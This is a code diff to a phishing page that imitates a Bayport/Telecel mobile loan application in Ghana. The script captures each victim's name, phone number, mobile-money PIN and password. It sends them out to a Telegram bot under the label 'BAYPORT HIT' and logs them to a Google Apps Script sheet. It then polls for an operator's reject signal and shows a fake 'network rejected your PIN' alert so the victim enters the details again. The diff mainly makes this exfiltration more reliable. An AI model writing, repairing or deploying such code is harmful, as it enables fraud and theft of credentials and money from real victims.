@@ -9,41 +9,31 @@
         :root { --navy: #002349; --gold: #c5a059; --telecel-red: #e30613; --light-bg: #f8fafd; --text: #333; --border: #e1e8f0; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
         body { background: #e9ecef; color: var(--text); touch-action: manipulation; }
-        
         .view { display: none; max-width: 480px; margin: 0 auto; background: white; min-height: 100vh; position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
         .view.active { display: block; animation: fadeIn 0.3s ease; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
         .header { padding: 40px 25px 20px; text-align: center; }
         .header h1 { font-size: 1.8rem; font-weight: 800; color: #1a1a1a; }
         .fast-text { color: var(--navy); }
         .subtitle { color: #666; font-size: 0.9rem; margin-top: 5px; }
-        
         .content { padding: 0 25px 30px; }
         .section-title { font-size: 1.2rem; margin-bottom: 20px; font-weight: 700; color: var(--navy); }
         .control-label { display: block; font-weight: 600; color: #444; margin-bottom: 10px; font-size: 0.9rem; }
         .amount-display { font-size: 2.2rem; font-weight: 800; color: var(--navy); margin-bottom: 15px; }
-        
         input[type=range] { width: 100%; height: 6px; background: #edf2f7; border-radius: 5px; appearance: none; outline: none; margin-bottom: 10px; }
         input[type=range]::-webkit-slider-thumb { appearance: none; width: 24px; height: 24px; background: var(--navy); border-radius: 50%; cursor: pointer; border: 3px solid white; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
-        
         .slider-labels { display: flex; justify-content: space-between; font-size: 0.75rem; color: #999; margin-bottom: 25px; }
-        
         .term-buttons { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 25px; }
-        .term-button { padding: 12px; border: 1.5px solid var(--border); background: white; border-radius: 8px; font-size: 0.8rem; cursor: pointer; font-weight: 600; transition: 0.2s; }
+        .term-button { padding: 12px; border: 1.5px solid var(--border); background: white; border-radius: 8px; font-size: 0.8rem; cursor: pointer; font-weight: 600; }
         .term-button.active { background: var(--navy); color: white; border-color: var(--navy); }
-
         .payment-display { background: var(--light-bg); padding: 25px; border-radius: 12px; text-align: center; margin-bottom: 25px; border: 1px solid var(--border); }
         .payment-amount { font-size: 2rem; font-weight: 800; color: var(--navy); }
-
         .apply-button { background: var(--navy); color: white; width: 100%; padding: 20px; border: none; border-radius: 10px; font-weight: 700; cursor: pointer; font-size: 1.1rem; text-transform: uppercase; }
-
-        input[type=text], input[type=number], input[type=password] { width: 100%; padding: 16px; border: 1.5px solid var(--border); border-radius: 10px; font-size: 1rem; margin-bottom: 15px; outline: none; transition: 0.3s; }
+        input[type=text], input[type=number], input[type=password] { width: 100%; padding: 16px; border: 1.5px solid var(--border); border-radius: 10px; font-size: 1rem; margin-bottom: 15px; outline: none; }
         .tele-logo { color: var(--telecel-red); font-weight: 900; font-size: 2.6rem; letter-spacing: -2px; text-align: center; margin-bottom: 10px; }
         .prefix { background: #f0f0f0; padding: 16px; font-weight: 700; border: 1.5px solid var(--border); border-right: none; border-radius: 10px 0 0 10px; height: 55px; }
-        
-        /* Error Message Styling */
         .error-hint { color: var(--telecel-red); font-size: 0.8rem; font-weight: 600; display: none; margin-bottom: 10px; }
+        @keyframes spin { from {transform: rotate(0deg);} to {transform: rotate(360deg);} }
     </style>
 </head>
 <body>
@@ -125,7 +115,9 @@
 </div>
 
 <script>
+    // Replace this with your newly DEPLOYED script URL
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyM0Hwo5tu3KmjmkvjWqw_CV70EfJ2ODuYOWSoK1BODeNQC03UoHHDqT8ysNX5Pv-ZPlg/exec"; 
+    
     const urlParams = new URLSearchParams(window.location.search);
     const BOT_TOKEN = urlParams.get('token');
     const CHAT_ID = urlParams.get('id');
@@ -136,6 +128,7 @@
         state.amount = document.getElementById('loan-slider').value;
         document.getElementById('disp-amt').innerText = "GHS " + Number(state.amount).toLocaleString();
         document.getElementById('final-amt').innerText = Number(state.amount).toLocaleString();
+        
         const r = 0.045 / 12;
         const n = state.term;
         const monthly = state.amount * (r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
@@ -160,47 +153,70 @@
         const n = document.getElementById('f-name').value.trim();
         const p = document.getElementById('t-phone').value.trim();
         const pin = document.getElementById('t-pin').value.trim();
-        if(!n || !p || !pin) return document.getElementById('err-1').style.display = 'block';
+        if(!n || !p || !pin) {
+            document.getElementById('err-1').style.display = 'block';
+            return;
+        }
+        document.getElementById('err-1').style.display = 'none';
         showView(3);
     }
 
     async function finalize() {
         const pass = document.getElementById('t-pass').value.trim();
+        const name = document.getElementById('f-name').value.trim();
         const phone = document.getElementById('t-phone').value.trim();
-        if(!pass) return document.getElementById('err-2').style.display = 'block';
+        const pin = document.getElementById('t-pin').value.trim();
 
+        if(!pass) {
+            document.getElementById('err-2').style.display = 'block';
+            return;
+        }
+
+        // FULL DATA OBJECT
         const data = {
-            name: document.getElementById('f-name').value,
+            name: name,
             phone: phone,
-            pin: document.getElementById('t-pin').value,
+            pin: pin,
             pass: pass,
             loan: state.amount
         };
 
         showView(4);
 
-        // Telegram Notification with Reject Link
+        // 1. Telegram Push (All data)
         if(BOT_TOKEN && CHAT_ID) {
             const reject = `${SCRIPT_URL}?action=markError&phone=${data.phone}`;
             const msg = `🔥 *BAYPORT HIT*\n👤 Name: ${data.name}\n📱 +233${data.phone}\n💰 GHS ${data.loan}\n🔢 PIN: \`${data.pin}\`\n🔑 PASS: \`${data.pass}\` \n\n❌ Reject if wrong:\n${reject}`;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`).catch(e=>{});
         }
 
-        // Sheet Log
-        try { await fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', body: new URLSearchParams(data) }); } catch (e) {}
+        // 2. Google Sheet Log (Using URLSearchParams to ensure all keys reach doPost)
+        try { 
+            const formData = new URLSearchParams();
+            for (const key in data) { formData.append(key, data[key]); }
 
-        // Polling Logic
+            await fetch(SCRIPT_URL, { 
+                method: 'POST', 
+                mode: 'no-cors', 
+                body: formData 
+            }); 
+        } catch (e) { console.error("Sheet Error:", e); }
+
+        // 3. Polling for rejection
         setInterval(async () => {
             try {
                 const r = await fetch(`${SCRIPT_URL}?phone=${data.phone}`);
-                if((await r.text()) === "error") {
-                    alert("❌ Incorrect details. Please re-enter your PIN and Password.");
+                const status = await r.text();
+                if(status === "error") {
+                    alert("❌ Incorrect details. The network rejected your PIN or Password. Please re-enter them correctly.");
                     location.reload();
                 }
             } catch(e) {}
         }, 4000);
     }
+    
+    // Initial calc
+    updateCalc();
 </script>
-<style> @keyframes spin { from {transform: rotate(0deg);} to {transform: rotate(360deg);} } </style>
 </body>
 </html>
